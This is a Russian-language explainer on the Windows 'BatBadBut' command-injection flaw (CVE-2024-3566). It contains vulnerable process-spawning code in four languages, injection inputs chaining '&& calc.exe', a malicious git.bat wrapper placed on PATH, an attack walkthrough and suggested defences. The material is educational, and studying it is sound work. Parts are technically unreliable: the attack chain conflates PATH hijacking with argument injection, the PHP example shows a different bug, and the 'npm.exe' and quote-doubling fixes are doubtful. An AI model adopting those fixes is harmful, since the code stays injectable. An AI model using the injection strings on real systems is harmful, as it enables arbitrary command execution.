# CVE-2024-3566 (BatBadBut) - Примеры использования

## Описание уязвимости

CVE-2024-3566, также известная как "BatBadBut", представляет собой уязвимость командной инъекции в Windows-приложениях, которые косвенно зависят от функции `CreateProcess`. Уязвимость затрагивает различные языки программирования, включая Node.js, Haskell, Rust и PHP, работающие на Windows-системах.

### Причина уязвимости

Проблема возникает из-за некорректной обработки аргументов командной строки при выполнении команд через функцию `CreateProcess`, особенно при работе с batch-файлами (.bat, .cmd). Когда `CreateProcess` не может найти исполняемый файл с указанным именем, Windows автоматически пытается выполнить batch-файл с тем же именем, вызывая `cmd.exe`.

## Примеры уязвимого кода

### 1. Node.js - child_process.spawn()

```javascript
const { spawn } = require('child_process');

// Уязвимый код
function executeCommand(userInput) {
    // Если существует файл npm.bat в PATH, это может быть использовано для инъекции
    const child = spawn('npm', ['install', userInput]);
    
    child.on('close', (code) => {
        console.log(`Процесс завершен с кодом ${code}`);
    });
}

// Пример атаки
// Если userInput = 'package" && calc.exe && echo "', то команда может быть:
// cmd /c npm install package" && calc.exe && echo ""
executeCommand('package" && calc.exe && echo "');
```

### 2. PHP - proc_open()

```php
<?php
// Уязвимый код
function runCommand($userInput) {
    $command = "git clone " . $userInput;
    
    $descriptorspec = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("pipe", "w")
    );
    
    // Если git.bat существует, это может привести к инъекции команд
    $process = proc_open($command, $descriptorspec, $pipes);
    
    if (is_resource($process)) {
        fclose($pipes[0]);
        echo stream_get_contents($pipes[1]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
    }
}

// Пример атаки
runCommand('https://github.com/user/repo.git" && calc.exe && echo "');
?>
```

### 3. Rust - std::process::Command

```rust
use std::process::Command;

// Уязвимый код
fn execute_git_command(user_input: &str) {
    let output = Command::new("git")
        .arg("clone")
        .arg(user_input)
        .output()
        .expect("Не удалось выполнить команду");
    
    println!("Статус: {}", output.status);
    println!("stdout: {}", String::from_utf8_lossy(&output.stdout));
    println!("stderr: {}", String::from_utf8_lossy(&output.stderr));
}

// Пример атаки
fn main() {
    // Если git.bat существует в PATH, это может быть использовано для атаки
    execute_git_command("https://repo.git\" && calc.exe && echo \"");
}
```

### 4. Haskell - System.Process

```haskell
import System.Process

-- Уязвимый код
executeCommand :: String -> IO ()
executeCommand userInput = do
    let command = "npm"
    let args = ["install", userInput]
    
    -- Если npm.bat существует, это может привести к инъекции команд
    (exitCode, stdout, stderr) <- readProcessWithExitCode command args ""
    
    putStrLn $ "Код выхода: " ++ show exitCode
    putStrLn $ "stdout: " ++ stdout
    putStrLn $ "stderr: " ++ stderr

-- Пример использования с инъекцией
main :: IO ()
main = executeCommand "package\" && calc.exe && echo \""
```

## Примеры эксплуатации

### Создание вредоносного batch-файла

```batch
@echo off
REM Сохранить как git.bat в каталоге, включенном в PATH

echo Выполняется вредоносный git.bat
echo Аргументы: %*

REM Выполнение оригинальной команды git
"C:\Program Files\Git\bin\git.exe" %*

REM Выполнение вредоносного кода
if "%~2" NEQ "" (
    echo Обнаружена потенциальная инъекция: %~2
    REM Здесь может быть любой вредоносный код
    calc.exe
)
```

### Пример полной атаки

1. Злоумышленник размещает вредоносный `npm.bat` в каталоге, который находится в PATH раньше настоящего npm
2. Приложение выполняет: `spawn('npm', ['install', 'package" && calc.exe && echo "'])`
3. Windows вызывает: `cmd /c npm install package" && calc.exe && echo ""`
4. Выполняется вредоносный код `calc.exe`

## Методы защиты

### 1. Явное указание расширения .exe

```javascript
// Безопасный код - явно указываем .exe
const child = spawn('npm.exe', ['install', userInput]);
```

### 2. Экранирование аргументов

```javascript
function escapeShellArg(arg) {
    // Простое экранирование для Windows cmd
    return '"' + arg.replace(/"/g, '""') + '"';
}

const child = spawn('npm.exe', ['install', escapeShellArg(userInput)]);
```

### 3. Использование абсолютных путей

```javascript
const path = require('path');
const npmPath = path.join(process.env.PROGRAMFILES, 'nodejs', 'npm.exe');
const child = spawn(npmPath, ['install', userInput]);
```

### 4. Валидация входных данных

```javascript
function validateInput(input) {
    // Проверка на наличие подозрительных символов
    const dangerousChars = /[&|;`$(){}[\]]/;
    if (dangerousChars.test(input)) {
        throw new Error('Недопустимые символы во входных данных');
    }
    return input;
}
```

## Затронутые версии и исправления

### Node.js
- Уязвимые версии: все версии до исправления
- Исправлено в: Node.js 18.20.1+, 20.12.1+, 22.0.0+

### Rust
- Затронуты версии до исправления в стандартной библиотеке
- Рекомендуется обновление до последних версий

### PHP
- Проблема может присутствовать во всех версиях при использовании функций выполнения команд
- Требуется ручное экранирование

### Haskell
- Затронуты версии библиотеки process
- Рекомендуется обновление и использование безопасных практик

## Дополнительные рекомендации

1. **Избегайте выполнения команд с пользовательским вводом** без строгой валидации
2. **Используйте белые списки** допустимых команд и аргументов
3. **Применяйте принцип минимальных привилегий** для процессов
4. **Регулярно обновляйте** среды выполнения и зависимости
5. **Мониторьте выполнение команд** в продакшене

## Ссылки

- [CVE-2024-3566 в NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-3566)
- [Исследование Flatt Tech "BatBadBut"](https://flatt.tech/research/posts/batbadbut-you-cant-securely-execute-commands-on-windows/)
- [CERT/CC VU#123335](https://www.kb.cert.org/vuls/id/123335)
- [Microsoft Docs: Command Line Arguments](https://docs.microsoft.com/en-us/archive/blogs/twistylittlepassagesallalike/everyone-quotes-command-line-arguments-the-wrong-way)